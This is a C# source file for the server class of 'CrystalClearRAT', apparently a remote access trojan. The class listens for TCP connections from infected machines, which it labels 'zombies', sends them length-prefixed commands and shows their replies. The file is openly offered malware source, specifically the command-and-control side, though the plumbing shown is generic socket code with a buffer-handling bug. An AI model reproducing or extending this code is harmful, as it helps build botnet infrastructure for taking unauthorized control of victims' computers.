using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Input;
using CrystalClearRAT.ZombieModel;

namespace CrystalClearRAT.Web
{
    public static class Server
    {


        public static bool IsRunning { get; private set; } = false;

        public static Socket ServerSocket { get; private set; }


        public static void Start(int port)
        {
            if (IsRunning) throw new InvalidOperationException("The server is already running.");

            ServerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            ServerSocket.Bind(new IPEndPoint(IPAddress.Any, port));
            ServerSocket.Listen(0);

            ServerSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }

        public static void Send(byte[] data, Zombie zombie)
        {
            byte[] dataLength = BitConverter.GetBytes(data.Length);

            try
            {
                zombie.Socket.BeginSend(dataLength, 0, dataLength.Length, 0, new AsyncCallback(SendCallback), new StateObject(zombie, data));
            }
            catch (SocketException)
            {
                zombie.Destroy();
            }
        }

        private static void SendCallback(IAsyncResult ar)
        {
            StateObject state = (StateObject)ar.AsyncState;
            try
            {
                state.Zombie.Socket.EndSend(ar);
                state.Zombie.Socket.Send(state.Buffer);
            }
            catch
            {
                state.Zombie.Destroy();
            }

        }

        private static void AcceptCallback(IAsyncResult ar)
        {
            Socket accepted = ServerSocket.EndAccept(ar);

            IPEndPoint acceptedEndPoint = (IPEndPoint)accepted.RemoteEndPoint;

            Zombie zombie;

            zombie = new Zombie(acceptedEndPoint.Address.ToString(), acceptedEndPoint.Port, accepted);

            Receive(zombie);

            ServerSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);

        }



        private static void Receive(Zombie zombie)
        {
            byte bufLength = 4;
            byte[] buffer = new byte[bufLength];

            try
            {
                zombie.Socket.BeginReceive(buffer, 0, bufLength, 0, new AsyncCallback(ReceiveCallback), new StateObject(zombie, buffer));
            }
            catch (SocketException)
            {
                Console.WriteLine("Zombie disconnected. Cleaning up.");
                zombie.Destroy();

            }



        }

        private static void ReceiveCallback(IAsyncResult ar)
        {

            StateObject state = (StateObject)ar.AsyncState;

            try
            {
                state.Zombie.Socket.EndReceive(ar);
            }

            catch (SocketException)
            {
                Console.WriteLine("Zombie disconnected. Cleaning up.");
                state.Zombie.Destroy();
                return;

            }

            int bufSize = BitConverter.ToInt32(state.Buffer, 0);
            byte[] buffer;
            MemoryStream ms = new MemoryStream();

            while (bufSize > 0)
            {
                if (bufSize < state.Zombie.Socket.ReceiveBufferSize)
                {
                    buffer = new byte[bufSize];
                }

                else
                {
                    buffer = new byte[state.Zombie.Socket.ReceiveBufferSize];
                }

                int rec = state.Zombie.Socket.Receive(buffer, 0, buffer.Length, 0);
                bufSize -= rec;

                ms.Write(buffer, 0, buffer.Length);
            }

            ms.Close();

            byte[] data = ms.ToArray();

            ms.Dispose();


            System.Windows.MessageBox.Show((System.Text.Encoding.UTF8.GetString(data)));

            Receive(state.Zombie);



        }


    }
}
